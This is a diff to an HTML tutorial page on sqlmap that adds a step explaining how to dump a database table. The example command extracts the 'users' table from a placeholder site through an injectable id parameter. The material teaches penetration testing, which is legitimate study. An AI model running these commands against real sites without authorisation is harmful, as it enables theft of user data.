@@ -245,7 +245,15 @@ Databases such as information_schema, performance_schema, and mysql are default 
 <div class="code-box2"><span class="username">andrew@local:~$</span> sqlmap https://mywebsite.com/documents.php?id=1 -D mywebsite_db -tables</div><br><br>
 
 
-After running this command, we will receive an output similar to:
+After running this command, we will receive an output similar to:<br><br>
+
+...<br><br>
+
+To extract the content of a specific table, we will enter the database with -D and the table name using the -T attribute and use the "-dump" option.<br><br>
+
+<div class="code-box2"><span class="username">andrew@local:~$</span> sqlmap https://mywebsite.com/documents.php?id=1 -D mywebsite_db -T users -dump</div><br><br>
+
+
 
 
 
